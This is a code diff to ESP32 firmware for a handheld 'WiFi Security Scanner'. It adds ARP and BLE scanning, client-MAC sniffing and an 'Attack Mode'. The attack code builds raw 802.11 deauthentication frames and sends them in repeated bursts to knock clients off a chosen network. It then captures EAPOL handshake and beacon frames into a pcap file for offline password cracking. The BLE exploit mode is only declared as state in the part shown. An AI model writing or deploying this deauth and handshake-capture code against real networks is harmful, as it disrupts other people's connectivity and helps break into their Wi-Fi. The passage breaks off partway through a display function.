@@ -1,8 +1,11 @@
 // ============================================================================
 //  WiFi Security Scanner
 //
-// - Wifi Scan
+// - Wifi Scanner
 // - Probe Sniffer
+// - ARP Scanner
+// - BLE Scanner
+// - Attack Mode / Handshake Capture
 // - Scan Sessions
 // - Web Report
 //
@@ -21,9 +24,14 @@ EInkDisplay_WirelessPaperV1_2 display;
 #include <esp_wifi.h>
 #include <esp_bt.h>
 #include <esp_sleep.h>
+#include <BLEDevice.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
 
 #include <LittleFS.h>
 #define FS LittleFS
+
+extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void* buffer, uint16_t len);
 
 U8G2_FOR_ADAFRUIT_GFX u8g2;
 
@@ -72,6 +80,8 @@ const uint8_t* BOLD_FONT = u8g2_font_helvB08_te;
 // ============================================================================
 static const char* AP_SSID = "WiFi-Security-Scanner";
 static const char* AP_PASS = "SetYourOwnPassword";
+static const char* ARP_AP_SSID  = "ARP-Config";
+static const char* ARP_AP_PASS  = "SetYourOwnPassword";
 
 // ============================================================================
 //  Display adapter
@@ -101,13 +111,17 @@ enum Mode {
   MODE_DETAIL,
   MODE_WEBREPORT,
   MODE_SESSIONS,
-  MODE_PROBE
+  MODE_PROBE,
+  MODE_ARP_CONFIG,
+  MODE_ARP,
+  MODE_BLE,
+  MODE_BLE_DETAIL,
+  MODE_BLE_EXPLOIT,
+  MODE_ATTACK_MENU,
+  MODE_TARGET_SELECT,
+  MODE_HANDSHAKE
 };
 Mode mode = MODE_MENU;
-
-static int         menuSelected                    = 0;
-static const int   MENU_ITEMS                      = 4;
-static const char* menuLabels[MENU_ITEMS]          = { "WiFi Scan", "Probe Sniffer", "Scan Sessions", "Web Report" };
 
 // ============================================================================
 //  Button ISR queue
@@ -353,12 +367,45 @@ struct ChannelStat {
 static ChannelStat g_channelStats[13];
 static uint8_t     g_channelOrder[13];
 
+struct ClientResult {
+  uint8_t  clientMac[6];
+  uint8_t  apBssid[6];
+  uint32_t lastSeen;
+};
+
+static ClientResult g_clients[100];
+static int          g_clientCount = 0;
+
+// ============================================================================
+//  Handshake storage
+// ============================================================================
+
+#define MAX_HANDSHAKES 50
+
+struct HandshakeMeta {
+    uint32_t timestamp;
+    char ssid[33];
+    uint8_t bssid[6];
+    uint8_t channel;
+    uint16_t eapolCount;
+    char filename[20];
+};
+
+struct HandshakeIndex {
+    uint16_t count;
+    uint16_t next;
+    HandshakeMeta sessions[MAX_HANDSHAKES];
+};
+
+static HandshakeIndex g_handshakeIndex;
+static bool g_handshakeIndexLoaded = false;
+
 // ============================================================================
 //  Session storage
 //
 //  Each scan session is saved as a CSV file in /sessions/
 //  An index file /sessions/index.bin tracks metadata for all sessions.
-//  Maximum 50 sessions, ring buffer - oldest overwritten when full.
+//  Maximum 200 sessions, ring buffer - oldest overwritten when full.
 // ============================================================================
 #define MAX_SESSIONS 200
 
@@ -380,11 +427,235 @@ struct SessionIndex {
 static SessionIndex g_sessionIndex;
 static bool         g_sessionIndexLoaded = false;
 
+// Explicit declarations for functions used before their definitions.
+static void saveProbeSession();
+static void saveArpSession();
+static void saveBleSession();
+
 // Active session tracking
 static bool     g_sessionActive          = false;
 static uint16_t g_sessionSlot            = 0;
 static uint8_t  g_scansSinceSessionSave  = 0;
 static const uint8_t SESSION_SAVE_EVERY  = 5;
+
+// ============================================================================
+//  ARP session storage
+// ============================================================================
+#define MAX_ARP_SESSIONS 200
+
+static uint16_t g_arpSessionNext   = 0;
+static uint16_t g_arpSessionTotal  = 0;
+static bool     g_arpSessionIndexLoaded = false;
+
+// ============================================================================
+//  BLE Scanner
+// ============================================================================
+#define MAX_BLE_DEVICES 100
+#define MAX_BLE_SESSIONS 200
+
+struct BleDevice {
+  uint8_t  mac[6];
+  char     name[32];
+  int8_t   rssi;
+  uint8_t  macType;        // 0=public, 1=random static, 2=random resolvable
+  bool     connectable;
+  uint16_t manufacturer;   // manufacturer ID
+  bool     isIoT;          // flagged as IoT device
+  bool     isApple;
+  bool     isSamsung;
+  bool     isFitness;
+  uint8_t  serviceCount;
+  uint32_t firstSeen;
+  uint32_t lastSeen;
+  uint16_t count;
+};
+
+static BleDevice  g_bleDevices[MAX_BLE_DEVICES];
+static int        g_bleCount        = 0;
+static bool       g_bleActive       = false;
+static uint16_t   g_bleScanNext     = 0;
+static uint16_t   g_bleScanTotal    = 0;
+static bool       g_bleIndexLoaded  = false;
+static BLEScan*   g_bleScan         = nullptr;
+static int        g_bleScrollOffset = 0;
+
+// BLE exploit state
+static int            g_bleSelectedIdx    = -1;
+static int            g_blePrevSelected   = -1;
+static BLEClient*     g_bleClient         = nullptr;
+static bool           g_bleConnected      = false;
+
+struct BleCharInfo {
+  char     uuid[37];
+  uint8_t  value[32];
+  uint8_t  valueLen;
+  bool     canRead;
+  bool     canWrite;
+  bool     canNotify;
+};
+
+static BleCharInfo g_bleChars[20];
+static int         g_bleCharCount = 0;
+
+// ============================================================================
+//  BLE device classification
+// ============================================================================
+static const char* bleVendorName(uint16_t manufacturer) {
+  switch (manufacturer) {
+    case 0x0006: return "Microsoft";
+    case 0x000D: return "Texas Instruments";
+    case 0x000F: return "Broadcom";
+    case 0x0010: return "Mitel";
+    case 0x001D: return "Qualcomm";
+    case 0x0025: return "NXP/Philips";
+    case 0x0030: return "STMicro";
+    case 0x003C: return "BlackBerry";
+    case 0x004C: return "Apple";
+    case 0x004F: return "Polar";
+    case 0x0059: return "Nordic Semi";
+    case 0x0065: return "Realtek";
+    case 0x0075: return "Samsung";
+    case 0x0077: return "Garmin";
+    case 0x0087: return "CSR";
+    case 0x00A0: return "Lenovo";
+    case 0x00C4: return "LG";
+    case 0x00D2: return "Bose";
+    case 0x00E0: return "Google";
+    case 0x00E5: return "Tesla";
+    case 0x00FE: return "Huawei";
+    case 0x0118: return "Tile";
+    case 0x0131: return "Sony";
+    case 0x0157: return "Fitbit";
+    case 0x0171: return "Amazon";
+    case 0x01DA: return "Xiaomi";
+    case 0x0215: return "Anker";
+    case 0x022D: return "DJI";
+    case 0x02D0: return "Reaktor";
+    case 0x0312: return "Nintendo";
+    case 0x038F: return "Jabra";
+    case 0x03DA: return "Logitech";
+    case 0x0499: return "Ruuvi";
+    case 0x05A7: return "Nothing";
+    case 0x0600: return "Meta";
+    case 0x0850: return "Beats";
+    case 0x0881: return "JBL";
+    case 0xFFFF: return "Test Vendor";
+    default:     return "Unknown";
+  }
+}
+
+static bool bleIsIoT(uint16_t manufacturer, const char* name, uint8_t serviceCount) {
+  // No name + custom services = likely IoT
+  if (name[0] == '\0' && serviceCount > 0) return true;
+
+  // Known IoT name patterns
+  if (strstr(name, "ESP"))        return true; // ESP32 devices
+  if (strstr(name, "Shelly"))     return true; // Shelly smart home
+  if (strstr(name, "Tuya"))       return true; // Tuya platform
+  if (strstr(name, "SmartLife"))  return true; // Tuya SmartLife
+  if (strstr(name, "eWeLink"))    return true; // Sonoff/eWeLink
+  if (strstr(name, "TP-LINK"))    return true; // TP-Link
+  if (strstr(name, "Tapo"))       return true; // TP-Link Tapo
+  if (strstr(name, "Kasa"))       return true; // TP-Link Kasa
+  if (strstr(name, "Nest"))       return true; // Google Nest
+  if (strstr(name, "Ring"))       return true; // Ring doorbell
+  if (strstr(name, "Blink"))      return true; // Blink cameras
+  if (strstr(name, "Arlo"))       return true; // Arlo cameras
+  if (strstr(name, "Eufy"))       return true; // Eufy
+  if (strstr(name, "Wyze"))       return true; // Wyze
+  if (strstr(name, "Roborock"))   return true; // Roborock vacuums
+  if (strstr(name, "Mijia"))      return true; // Xiaomi Mijia
+  if (strstr(name, "Aqara"))      return true; // Aqara sensors
+  if (strstr(name, "Yeelight"))   return true; // Yeelight bulbs
+  if (strstr(name, "Jura"))       return true;
+  if (strstr(name, "IKEA"))       return true;
+  if (strstr(name, "Hue"))        return true;
+  if (strstr(name, "Tradfri"))    return true;
+  if (strstr(name, "Sonos"))      return true;
+  if (strstr(name, "Nespresso"))  return true;
+  if (strstr(name, "Xiaomi"))     return true;
+  if (strstr(name, "LYWSD"))      return true; // Xiaomi temp sensor
+  if (strstr(name, "GVH"))        return true; // Govee sensors
+  if (strstr(name, "iNode"))      return true;
+
+  return false;
+}
+
+// ============================================================================
+//  BLE advertised device callback
+// ============================================================================
+class BleCallback : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice dev) {
+    if (!g_bleActive) return;
+
+    // Parse MAC
+    uint8_t mac[6];
+    String addr = dev.getAddress().toString();
+    sscanf(addr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    &mac[5], &mac[4], &mac[3], &mac[2], &mac[1], &mac[0]);
+
+    // Check if already tracked
+    for (int i = 0; i < g_bleCount; i++) {
+      if (memcmp(g_bleDevices[i].mac, mac, 6) == 0) {
+        g_bleDevices[i].rssi     = dev.getRSSI();
+        g_bleDevices[i].lastSeen = millis();
+        g_bleDevices[i].count++;
+        return;
+      }
+    }
+
+    if (g_bleCount >= MAX_BLE_DEVICES) return;
+
+    // New device
+    BleDevice& d = g_bleDevices[g_bleCount];
+    memset(&d, 0, sizeof(d));
+    memcpy(d.mac, mac, 6);
+    d.rssi        = dev.getRSSI();
+    d.connectable = dev.isAdvertisingService(BLEUUID((uint16_t)0)) ? false : dev.getAdvType() == 0;
+    d.firstSeen   = millis();
+    d.lastSeen    = millis();
+    d.count       = 1;
+    d.macType     = (uint8_t)dev.getAddressType();
+
+    if (dev.haveName()) {
+      String n = dev.getName();
+      strncpy(d.name, n.c_str(), 31);
+      d.name[31] = '\0';
+    }
+
+    // Manufacturer
+    if (dev.haveManufacturerData()) {
+      String mfr = dev.getManufacturerData();
+      if (mfr.length() >= 2) {
+        d.manufacturer = (uint8_t)mfr[0] | ((uint8_t)mfr[1] << 8);
+      }
+    }
+
+    // Service count
+    d.serviceCount = dev.getServiceUUIDCount();
+
+    // Classification
+    d.isApple   = (d.manufacturer == 0x004C);
+    d.isSamsung = (d.manufacturer == 0x0075);
+    d.isFitness = (d.manufacturer == 0x0157 || d.manufacturer == 0x0077 ||
+                   d.manufacturer == 0x004F);
+    d.isIoT     = bleIsIoT(d.manufacturer, d.name, d.serviceCount);
+
+    // Serial log
+    Serial.printf("BLE: %s [%s] RSSI:%d %s%s%s%s\n",
+      d.name[0] ? d.name : "(unnamed)",
+      addr.c_str(),
+      d.rssi,
+      d.isApple   ? "Apple "   : "",
+      d.isSamsung ? "Samsung " : "",
+      d.isFitness ? "Fitness " : "",
+      d.isIoT     ? "IoT "     : "");
+
+    g_bleCount++;
+  }
+};
+
+static BleCallback g_bleCallback;
 
 // ============================================================================
 //  Scan result
@@ -395,14 +666,13 @@ static const uint8_t SESSION_SAVE_EVERY  = 5;
 // ============================================================================
 struct ScanResult {
   char    essid[33];  // network name
-  uint8_t bssid[6];  // access point MAC
+  uint8_t bssid[6];   // access point MAC
   int     rssi;       // signal strength (dBm)
   int     channel;    // WiFi channel
   int     maxRate;    // estimated link rate (Mbps)
   bool    rateIsN;    // true = append 'n' suffix (802.11n)
   uint8_t authMode;   // raw wifi_auth_mode_t
   uint8_t riskLevel;  // 0=LOW 1=MEDIUM 2=HIGH 3=CRITICAL
-    // New features
   uint32_t firstSeen;
   uint32_t lastSeen;
   uint16_t sightings;
@@ -419,7 +689,7 @@ static int        g_cursorIndex     = 0;
 static bool       g_hasScanned      = false;
 static int        g_prevCursorIndex = -1; // for partial cursor refresh
 
-// Historical database — persists across scans, keyed by BSSID
+// Historical database - persists across scans, keyed by BSSID
 // Stores strongest RSSI seen per unique access point
 static ScanResult g_seen[200];
 static int        g_seenCount   = 0;
@@ -546,16 +816,30 @@ static const char* riskColor(uint8_t risk) {
 // ============================================================================
 //  UI layout constants
 // ============================================================================
-static const int UI_MARGIN_X    = 6;
-static const int UI_HEADER_Y    = 12;
-static const int UI_HEADER_LINE = 16;
-static const int UI_FOOTER_LINE = SCREEN_H - 11;
-static const int UI_FOOTER_TEXT = SCREEN_H - 2;
-static const int MENU_TOP       = 28;
-static const int MENU_ROW_H     = 18;
-static const int SUMMARY_TOP    = 25;
-static const int SUMMARY_ROW_H  = 9;
-static const int SUMMARY_ROWS   = 10;
+static const int UI_MARGIN_X      = 6;
+static const int UI_HEADER_Y      = 12;
+static const int UI_HEADER_LINE   = 16;
+static const int UI_FOOTER_LINE   = SCREEN_H - 11;
+static const int UI_FOOTER_TEXT   = SCREEN_H - 2;
+static const int MENU_TOP         = 26;
+static const int MENU_ROW_H       = 16;
+static const int SUMMARY_TOP      = 25;
+static const int SUMMARY_ROW_H    = 9;
+static const int SUMMARY_ROWS     = 10;
+static const int MENU_ITEMS       = 7;
+static const int MENU_VISIBLE     = 5;
+static int       menuSelected     = 0;
+static int       menuScrollOffset = 0;
+
+static const char* menuLabels[MENU_ITEMS] = {
+  "WiFi Scan",
+  "Probe Sniffer",
+  "ARP Scanner",
+  "BLE Scanner",
+  "Attack Mode",
+  "Scan Sessions",
+  "Web Report"
+};
 
 // ============================================================================
 //  Frame helpers
@@ -609,10 +893,12 @@ static void drawMenuRow(int y, bool selected, const char* title) {
 }
 
 static void drawMenuItems() {
-  for (int i = 0; i < MENU_ITEMS; i++) {
+  for (int i = 0; i < MENU_VISIBLE; i++) {
+    int itemIdx = menuScrollOffset + i;
+    if (itemIdx >= MENU_ITEMS) break;
     int y = MENU_TOP + (i * MENU_ROW_H);
     gfx.fillRect(UI_MARGIN_X, y, SCREEN_W - (UI_MARGIN_X * 2), MENU_ROW_H, 0);
-    drawMenuRow(y, i == menuSelected, menuLabels[i]);
+    drawMenuRow(y, itemIdx == menuSelected, menuLabels[itemIdx]);
   }
 }
 
@@ -625,13 +911,6 @@ static void drawMenu() {
 }
 
 static void updateMenuCursor() {
-  static int cursorMoves = 0;
-  cursorMoves++;
-  if (cursorMoves >= 5) {
-    cursorMoves = 0;
-    drawMenu();
-    return;
-  }
   display.fastmodeOn();
   drawMenuItems();
   display.update();
@@ -815,7 +1094,7 @@ static void drawDetail(int idx) {
 // ============================================================================
 //  Probe sniffer
 //  Captures 802.11 probe requests from nearby client devices.
-//  Runs in promiscuous mode — no connection to any network.
+//  Runs in promiscuous mode - no connection to any network.
 // ============================================================================
 static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type != WIFI_PKT_MGMT) return;
@@ -829,7 +1108,6 @@ static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type)
   uint8_t subtype = (payload[0] >> 4) & 0x0F;
   uint8_t ftype   = (payload[0] >> 2) & 0x03;
   if (ftype != 0) return;
-  if (subtype != 4 && subtype != 12 && subtype != 10) return;
 
   // Deauth / disassoc detection
   if (subtype == 12 || subtype == 10) {
@@ -838,7 +1116,41 @@ static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     return;
   }
 
+  // Association / reassociation request - client connecting to AP
+  if (subtype == 0 || subtype == 2) {
+    if (pkt->rx_ctrl.sig_len < 28) return;
+    const uint8_t* clientMac = payload + 10; // src
+    const uint8_t* apBssid   = payload + 16; // bssid
+    if (clientMac[0] & 0x01) return;         // skip multicast
+
+    // Check if already tracked
+    bool found = false;
+    for (int i = 0; i < g_clientCount; i++) {
+      if (memcmp(g_clients[i].clientMac, clientMac, 6) == 0 &&
+          memcmp(g_clients[i].apBssid,   apBssid,   6) == 0) {
+        g_clients[i].lastSeen = millis();
+        found = true;
+        break;
+      }
+    }
+
+    if (!found && g_clientCount < 100) {
+      memcpy(g_clients[g_clientCount].clientMac, clientMac, 6);
+      memcpy(g_clients[g_clientCount].apBssid,   apBssid,   6);
+      g_clients[g_clientCount].lastSeen = millis();
+      g_clientCount++;
+      Serial.printf("Client found: %02X:%02X:%02X:%02X:%02X:%02X -> AP %02X:%02X:%02X:%02X:%02X:%02X\n",
+        clientMac[0], clientMac[1], clientMac[2],
+        clientMac[3], clientMac[4], clientMac[5],
+        apBssid[0],   apBssid[1],   apBssid[2],
+        apBssid[3],   apBssid[4],   apBssid[5]);
+    }
+    return;
+  }
+
   // From here on subtype == 4 (probe request)
+  if (subtype != 4) return;
+
   const uint8_t* mac = payload + 10;
   if (mac[0] & 0x01) return;
 
@@ -869,13 +1181,9 @@ static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     pos += 2 + len;
   }
 
-  // Count everything including <any>
   g_probeTotalSeen++;
-
-  // Only store named probes
   if (!ssid[0]) return;
 
-  // Find existing entry
   for (int i = 0; i < g_probeCount; i++) {
     if (memcmp(g_probes[i].mac, mac, 6) == 0 &&
         strcmp(g_probes[i].ssid, ssid) == 0) {
@@ -886,7 +1194,6 @@ static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     }
   }
 
-  // New entry - ring buffer overwrites oldest when full
   int slot = g_probeCount < MAX_PROBES ? g_probeCount++ : 0;
   if (slot == 0 && g_probeCount >= MAX_PROBES) {
     uint32_t oldest = g_probes[0].firstSeen;
@@ -899,12 +1206,12 @@ static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type)
   }
   memcpy(g_probes[slot].mac, mac, 6);
   strncpy(g_probes[slot].ssid, ssid, 32);
-  g_probes[slot].ssid[32] = '\0';
-  g_probes[slot].rssi = rssi;
-  g_probes[slot].firstSeen = millis();
-  g_probes[slot].lastSeen = millis();
-  g_probes[slot].count = 1;
-  g_probes[slot].randomized = randomized;
+  g_probes[slot].ssid[32]    = '\0';
+  g_probes[slot].rssi        = rssi;
+  g_probes[slot].firstSeen   = millis();
+  g_probes[slot].lastSeen    = millis();
+  g_probes[slot].count       = 1;
+  g_probes[slot].randomized  = randomized;
 }
 
 static void surveyChannels() {
@@ -949,8 +1256,19 @@ static void surveyChannels() {
 static void loadProbeIndex() {
   File f = FS.open("/probes/index.bin", "r");
   if (!f) { g_probeNext = 0; g_probeTotal = 0; g_probeIndexLoaded = true; return; }
-  f.read((uint8_t*)&g_probeNext,  sizeof(g_probeNext));
-  f.read((uint8_t*)&g_probeTotal, sizeof(g_probeTotal));
+  const size_t expected = sizeof(g_probeNext) + sizeof(g_probeTotal);
+  if (f.size() != expected) {
+    f.close();
+    g_probeNext = 0;
+    g_probeTotal = 0;
+    g_probeIndexLoaded = true;
+    return;
+  }
+  if (f.read((uint8_t*)&g_probeNext, sizeof(g_probeNext)) != sizeof(g_probeNext) ||
+      f.read((uint8_t*)&g_probeTotal, sizeof(g_probeTotal)) != sizeof(g_probeTotal)) {
+    g_probeNext = 0;
+    g_probeTotal = 0;
+  }
   f.close();
   g_probeIndexLoaded = true;
 }
@@ -980,7 +1298,7 @@ static void saveProbeSession() {
     char bf[18];
     bssidFull(p.mac, bf, sizeof(bf));
     f.print(bf);
-    f.print(","); f.print(p.ssid[0] ? p.ssid : "<any>");
+    f.print(","); fileCsvEscaped(f, p.ssid[0] ? p.ssid : "<any>");
     f.print(","); f.print(p.rssi);
     f.print(","); f.print(p.firstSeen / 1000);
     f.print(","); f.print(p.lastSeen / 1000);
@@ -995,12 +1313,47 @@ static void saveProbeSession() {
   saveProbeIndex();
 }
 
+static void loadArpSessionIndex() {
+  File f = FS.open("/arp/index.bin", "r");
+  if (!f) {
+    g_arpSessionNext  = 0;
+    g_arpSessionTotal = 0;
+    g_arpSessionIndexLoaded = true;
+    return;
+  }
+  const size_t expected = sizeof(g_arpSessionNext) + sizeof(g_arpSessionTotal);
+  if (f.size() != expected) {
+    f.close();
+    g_arpSessionNext = 0;
+    g_arpSessionTotal = 0;
+    g_arpSessionIndexLoaded = true;
+    return;
+  }
+  if (f.read((uint8_t*)&g_arpSessionNext, sizeof(g_arpSessionNext)) != sizeof(g_arpSessionNext) ||
+      f.read((uint8_t*)&g_arpSessionTotal, sizeof(g_arpSessionTotal)) != sizeof(g_arpSessionTotal)) {
+    g_arpSessionNext = 0;
+    g_arpSessionTotal = 0;
+  }
+  f.close();
+  g_arpSessionIndexLoaded = true;
+}
+
+static void saveArpSessionIndex() {
+  File f = FS.open("/arp/index.bin", "w");
+  if (!f) return;
+  f.write((const uint8_t*)&g_arpSessionNext,  sizeof(g_arpSessionNext));
+  f.write((const uint8_t*)&g_arpSessionTotal, sizeof(g_arpSessionTotal));
+  f.close();
+}
+
 static void startProbeSniffer() {
   g_probeCount = 0;
   g_probeTotalSeen = 0;
   g_deauthCount   = 0;
   g_lastDeauthMs  = 0;
+  g_clientCount  = 0;
   memset(g_probes, 0, sizeof(g_probes));
+  memset(g_clients,  0, sizeof(g_clients));
 
   // Survey channels before entering promiscuous mode
   WiFi.mode(WIFI_STA);
@@ -1038,34 +1391,38 @@ static void drawSessions() {
 
   const int X = UI_MARGIN_X;
   const int Y = 28;
-  const int DY = 13;
+  const int DY = 11;  // reduced to fit 6 lines
 
-  // WiFi sessions count
   char line[48];
   snprintf(line, sizeof(line), "WiFi:  %d / %d sessions", g_sessionIndex.count, MAX_SESSIONS);
   u8g2.setCursor(X, Y);
   u8g2.print(line);
 
   snprintf(line, sizeof(line), "Probe: %d / %d sessions", g_probeTotal, MAX_PROBE_SESSIONS);
-
   u8g2.setCursor(X, Y + DY);
   u8g2.print(line);
 
-  // Flash usage
+  snprintf(line, sizeof(line), "ARP:   %d / %d sessions", g_arpSessionTotal, MAX_ARP_SESSIONS);
+  u8g2.setCursor(X, Y + DY * 2);
+  u8g2.print(line);
+
+  snprintf(line, sizeof(line), "BLE:   %d / %d sessions", g_bleScanTotal, MAX_BLE_SESSIONS);
+  u8g2.setCursor(X, Y + DY * 3);
+  u8g2.print(line);
+
   size_t total = fsTotalBytesSafe();
   size_t used  = fsUsedBytesSafe();
   int pct = total > 0 ? (int)((used * 100UL) / total) : 0;
   snprintf(line, sizeof(line), "Flash: %d%% used", pct);
-  u8g2.setCursor(X, Y + DY * 2);
+  u8g2.setCursor(X, Y + DY * 4);
   u8g2.print(line);
 
-  // Last WiFi scan info
   if (g_sessionIndex.count > 0) {
     int lastSlot = (g_sessionIndex.next - 1 + MAX_SESSIONS) % MAX_SESSIONS;
     const SessionMeta& last = g_sessionIndex.sessions[lastSlot];
-    snprintf(line, sizeof(line), "Last:  #%lu  %d APs", 
+    snprintf(line, sizeof(line), "Last:  #%lu  %d APs",
              (unsigned long)last.scanNumber, last.apCount);
-    u8g2.setCursor(X, Y + DY * 3);
+    u8g2.setCursor(X, Y + DY * 5);
     u8g2.print(line);
   }
 
@@ -1132,6 +1489,1184 @@ static void drawProbe() {
   }
   drawFooter(footer);
   endFrame();
+}
+
+// ============================================================================
+//  ATTACK MODE (Improved for Heltec Wireless Paper)
+// ============================================================================
+static uint8_t selectedBssid[6] = {0};
+static int     selectedChannel = 0;
+static char    selectedSSID[33] = "";
+static volatile bool attackRunning = false;
+static File    pcapFile;
+static uint32_t handshakePackets = 0;
+static uint32_t g_lastAttackMs = 0;
+static bool     waitingForHandshake = false;
+static uint32_t deauthSentMs = 0;
+static uint32_t lastHandshakeScreenUpdate = 0;
+static uint8_t capturedClientMac[6] = {0};
+static bool g_hasCapturedClient = false;
+static uint8_t beaconsCaptured = 0;
+
+// PCAP structures
+typedef struct {
+    uint32_t magic_number  = 0xa1b2c3d4;
+    uint16_t version_major = 2;
+    uint16_t version_minor = 4;
+    uint32_t thiszone      = 0;
+    uint32_t sigfigs       = 0;
+    uint32_t snaplen       = 2500;
+    uint32_t network       = 105;
+} pcap_hdr_t;
+
+typedef struct {
+    uint32_t ts_sec;
+    uint32_t ts_usec;
+    uint32_t incl_len;
+    uint32_t orig_len;
+} pcaprec_hdr_t;
+
+static void sendDeauthFrame(const uint8_t* apBssid, uint8_t channel) {
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(8);
+
+  uint8_t deauth[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x07, 0x00
+  };
+
+  // Direction 1: AP -> client (or broadcast)
+  if (g_hasCapturedClient) {
+    memcpy(&deauth[4], capturedClientMac, 6);
+  }
+  memcpy(&deauth[10], apBssid, 6);
+  memcpy(&deauth[16], apBssid, 6);
+
+  for (int i = 0; i < 32; i++) {
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_internal_tx(WIFI_IF_STA, deauth, sizeof(deauth));
+    delay(2);
+  }
+
+  if (g_hasCapturedClient) {
+    memcpy(&deauth[4],  apBssid, 6);
+    memcpy(&deauth[10], capturedClientMac, 6);
+    memcpy(&deauth[16], apBssid, 6);
+
+    for (int i = 0; i < 32; i++) {
+      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+      esp_wifi_internal_tx(WIFI_IF_STA, deauth, sizeof(deauth));
+      delay(2);
+    }
+  }
+
+  Serial.printf("Deauth sent to %s\n",
+    g_hasCapturedClient ? "client (targeted, both directions)" : "broadcast");
+}
+
+// NOTE: Keep this callback limited to capture bookkeeping. Filesystem writes
+// here are intentionally not redesigned in this maintenance pass because
+// changing the capture pipeline changes attack-mode behavior.
+static void IRAM_ATTR attackPromiscCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!attackRunning) return;
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* payload = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+
+  if (len < 24) return;
+
+  // Filter for our target BSSID
+  bool isOurNetwork = false;
+  if (len > 22 && memcmp(&payload[16], selectedBssid, 6) == 0) isOurNetwork = true;
+  if (!isOurNetwork && len > 28 && memcmp(&payload[22], selectedBssid, 6) == 0) isOurNetwork = true;
+  if (!isOurNetwork) return;
+
+  // Sniff client MAC from data frames only
+  if (type == WIFI_PKT_DATA && len > 22) {
+    if (memcmp(&payload[16], selectedBssid, 6) == 0 &&
+          !g_hasCapturedClient) {
+        memcpy(capturedClientMac, &payload[10], 6);
+        g_hasCapturedClient = true;
+
+      Serial.printf("Client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+        capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
+        capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
+    }
+  }
+
+  // Capture beacon frames from target AP - limit to 5 to save space
+  if (type == WIFI_PKT_MGMT && len > 36) {
+    uint8_t subtype = (payload[0] >> 4) & 0x0F;
+    if (subtype == 8 && beaconsCaptured < 5) {
+      if (memcmp(&payload[16], selectedBssid, 6) == 0) {
+        if (pcapFile) {
+          uint32_t nowUs = (uint32_t)esp_timer_get_time();
+          pcaprec_hdr_t rec = {
+            nowUs / 1000000UL,
+            nowUs % 1000000UL,
+            len, len
+          };
+          pcapFile.write((uint8_t*)&rec, sizeof(rec));
+          pcapFile.write(payload, len);
+          beaconsCaptured++;
+        }
+      }
+    }
+    return;
+  }
+
+  // Only search for EAPOL in data frames
+  if (type != WIFI_PKT_DATA) return;
+
+  // Search for EAPOL
+  for (int i = 24; i < len - 8; i++) {
+    bool found = false;
+
+    // SNAP + EAPOL
+    if (payload[i]   == 0xAA && payload[i+1] == 0xAA &&
+        payload[i+2] == 0x03 && payload[i+3] == 0x00 &&
+        payload[i+4] == 0x00 && payload[i+5] == 0x00 &&
+        payload[i+6] == 0x88 && payload[i+7] == 0x8E) {
+      found = true;
+    }
+
+    // Raw EAPOL
+    if (!found && payload[i] == 0x88 && payload[i+1] == 0x8E) {
+      found = true;
+    }
+
+    if (found) {
+      handshakePackets++;
+      Serial.printf("EAPOL captured. Total: %lu\n", handshakePackets);
+
+      if (pcapFile) {
+        uint32_t nowUs = (uint32_t)esp_timer_get_time();
+        pcaprec_hdr_t rec = {
+          nowUs / 1000000UL,
+          nowUs % 1000000UL,
+          len, len
+        };
+        pcapFile.write((uint8_t*)&rec, sizeof(rec));
+        pcapFile.write(payload, len);
+      }
+      break;
+    }
+  }
+}
+
+static void drawAttackMenu() {
+    beginFrame(false);
+    drawHeader("Attack Demo");
+    u8g2.setFont(MAIN_FONT);
+
+    const char* items[3] = {"1. Select Target", "2. Deauth Attack", "3. Handshake Capture"};
+    for (int i = 0; i < 3; i++) {
+        u8g2.setCursor(UI_MARGIN_X, 35 + i*18);
+        u8g2.print(items[i]);
+    }
+
+    u8g2.setCursor(UI_MARGIN_X, 95);
+    if (selectedSSID[0]) {
+        u8g2.print("Target: ");
+        u8g2.print(selectedSSID);
+    } else {
+        u8g2.print("No target selected");
+    }
+    drawFooter("2x=start  3x=reselect  hold=menu");
+    endFrame();
+}
+
+static void updateTargetCursor(int prevIdx) {
+  display.fastmodeOn();
+
+  const int ROW_H = 14;
+  const int TOP   = 32;
+  const int MAX_ROWS = 6;
+
+  // Erase and redraw previous row without cursor
+  int prevRow = prevIdx - g_scrollOffset;
+  if (prevRow >= 0 && prevRow < MAX_ROWS) {
+    int y = TOP + prevRow * ROW_H;
+    gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
+    int idx = g_scrollOffset + prevRow;
+    if (idx < g_resultCount) {
+      const ScanResult& r = g_results[idx];
+      char line[48];
+      snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
+      u8g2.setFont(u8g2_font_5x8_tf);
+      u8g2.setCursor(UI_MARGIN_X, y);
+      u8g2.print(line);
+    }
+  }
+
+  // Erase and redraw current row with cursor
+  int curRow = g_cursorIndex - g_scrollOffset;
